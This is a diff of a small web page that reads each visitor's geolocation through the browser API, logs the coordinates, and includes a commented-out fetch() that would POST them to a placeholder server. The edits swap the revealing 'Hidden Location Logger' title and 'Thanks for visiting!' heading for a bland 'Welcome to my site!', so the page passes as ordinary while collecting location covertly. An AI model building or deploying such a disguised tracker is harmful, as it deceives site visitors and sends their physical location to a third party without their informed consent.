@@ -2,10 +2,10 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Hidden Location Logger</title>
+  <title>Hidden Location</title>
 </head>
 <body>
-  <h1>Thanks for visiting!</h1>
+  <h1>Welcome to my site!</h1>
 
   <script>
     if (navigator.geolocation) {
@@ -14,10 +14,10 @@
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
 
-          // nothing written to the page, only console:
+          // only log to console:
           console.log("Visitor coords:", lat, lon);
 
-          // example: send to your server
+          // you could also send it to a server:
           /*
           fetch('https://your-server.com/log', {
             method: 'POST',
